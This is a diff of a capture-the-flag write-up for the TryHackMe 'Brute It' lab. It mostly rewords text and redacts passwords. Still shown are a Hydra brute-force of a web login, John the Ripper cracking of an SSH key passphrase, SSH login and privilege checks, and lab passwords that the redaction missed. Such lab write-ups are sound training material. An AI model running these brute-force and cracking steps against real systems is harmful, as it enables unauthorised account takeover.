@@ -37,12 +37,12 @@ sudo nano /etc/hosts
 
 ![2](./_attachment/THM_Brute-It_hosts-file.png)
 
-## Discovery of the Open Ports
+## Enumeration of the Open Ports
 
 Let's discover what are the open ports on this target. We will use 'nmap' :  
 
-```shell
-nmap -sV -sV -oA nmap/basic bruteit.thm -v
+``` shell
+nmap -sC -sV -oA nmap/basic bruteit.thm -v
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
@@ -54,14 +54,14 @@ Ok, HTTP on 80 and SSH on 22.  Classic!
 
 ### PORT 80 - HTTP - Apache httpd 2.4.29
 
-Let's check `http://bruteit.thm` in our browsers.  Nothing of interest here. Just the basic **Apache2 Web Server Default Page**.  
+Let's check `http://bruteit.thm` in our web browser.  Nothing of interest here. Just the basic **Apache2 Web Server Default Page**.  
 
 ## Hidden directories
 
 Are there some files and directories hidden from us on the HTTP server?
 Let's do a quick scan and get our answer. For this, I like using the tool `dirsearch`. It is perfect for a quick initial scan :
 
-```shell
+``` shell
  ❯ dirsearch -u bruteit.thm
 
   _|. _ _  _  _  _ _|_    v0.4.2
@@ -104,7 +104,7 @@ Task Completed
 
 > *[18:40:29] 200 -  671B  - /admin/**
 
-This is a directory worth further investigation. Let's type 'http://bruteit.thm/admin' in our favorite Web Browser :
+This is a directory worth further investigation. Let's type 'http://bruteit.thm/admin' in our favorite web browser :
 
 ![3](./_attachment/THM_Brute-It_http-login.png)
 
@@ -128,11 +128,11 @@ Now we learned something valuable!
 
 Now that we have a potentially valid username,  all we need now is to find the matching password.
 
-We'll do that using Hydra.  It is a nice brute forcing tool. It is fast, easy to use and well documented.  
+We'll do that using Hydra, a password brute forcing tool. It is fast, easy to use and well documented.  
 
-The process of brute forcing is simple.  The tool is going to try to login using the now known `admin` user in combination with a wordlist.  In this case we are going to use `rockyou.txt` as the password dictionary.
+The process of brute forcing is simple.  The tool is going to try to login using the known `admin` user in combination with a passwords contained in a password directory (**rockyou.txt** in this case).
 
-```shell
+``` shell
  ❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.235.217 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V
 
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -161,7 +161,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-13 23:27:
 [ATTEMPT] target 10.10.235.217 - login "admin" - pass "iverson" - 518 of 14344399 [child 7] (0/0)
 [ATTEMPT] target 10.10.235.217 - login "admin" - pass "andrei" - 519 of 14344399 [child 15] (0/0)
 [ATTEMPT] target 10.10.235.217 - login "admin" - pass "justine" - 520 of 14344399 [child 1] (0/0)
-[80][http-post-form] host: 10.10.235.217   login: admin   password: xavier
+[80][http-post-form] host: 10.10.235.217   login: admin   password: **[REDACTED]**
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-13 23:28:14
 
@@ -173,7 +173,7 @@ Bingo! The valid credentials are brute-forced.
 > [!DONE]
 > User: admin
 >
-> Pass: xavier
+> Password: **[REDACTED]**
 
 ---
 
@@ -190,7 +190,7 @@ The `id_rsa` is a **Private Key** file.  Those files are used as credentials to 
 
 First, let's create the **hash file** from `id_rsa`. We can use a Python script named `ssh2john.py`.  When done, let's start John and let `John` do his business:
 
-```shell
+``` shell
 ❯ ssh2john id_rsa > id_rsa.hash
 
 ❯ john id_rsa.hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
@@ -201,7 +201,7 @@ Cost 2 (iteration count) is 1 for all loaded hashes
 Node numbers 1-4 of 4 (fork)
 Press 'q' or Ctrl-C to abort, almost any other key for status
 rockinroll       (id_rsa)     
-4 1g 0:00:00:00 DONE (2023-04-14 04:27) 9.090g/s 165009p/s 165009c/s 165009C/s rockinroll
+4 1g 0:00:00:00 DONE (2023-04-14 04:27) 9.090g/s 165009p/s 165009c/s 165009C/s **[REDACTED]**
 2 0g 0:00:00:03 DONE (2023-04-14 04:28) 0g/s 1113Kp/s 1113Kc/s 1113KC/sabygurl69
 3 0g 0:00:00:03 DONE (2023-04-14 04:28) 0g/s 1086Kp/s 1086Kc/s 1086KC/sa6_123
 1 0g 0:00:00:03 DONE (2023-04-14 04:28) 0g/s 1051Kp/s 1051Kc/s 1051KC/sie168
@@ -210,9 +210,9 @@ Session completed.
 ```
 
 We got a match!
-The **password** is : `rockinroll`
+The **password** is : **[REDACTED]**
 
-We nee to give us ownership of the id_rsa key to be able to use it ourself.  To change the **file permission**:
+We need to give us ownership of the id_rsa key to be able to use it ourself.  To change the **file permission**:
 
 ```shell
 chmod 400 id_rsa
@@ -223,7 +223,7 @@ We can check with `ls -la` that `id_rsa` is now read-only and owned by a single 
 
 ## PORT 22 - SSH - OpenSSH 7.6p1
 
-Now, it is time to use everything we have gathered so far and connect to the target using **username** `john` on the previously discovered SSH server:
+Now, it is time to use everything we have gathered so far and connect to the target using the **username** `john` and the id_rsa file:  
 
 ```shell
 ❯ ssh -i id_rsa john@bruteit.thm
@@ -238,7 +238,7 @@ Enter passphrase for key 'id_rsa':
 
 And...
 
-```shell
+``` shell
 Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -267,7 +267,7 @@ user.txt
 
 Let's check what `john` is having permission to run as root using `sudo`:
 
-```shell
+``` shell
 john@bruteit:~$ sudo -l
 Matching Defaults entries for john on bruteit:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -307,6 +307,6 @@ There it is! The **root password** is `football`
 
 ## COMPLETED
 
-![Completed!](./_attachment/THM_Brute-It_header2.png)
+![Complete!](./_attachment/THM_Brute-It_header2.png)
 
 ![pdf-version](./THM%20-%20Brute%20It-pdf.pdf)
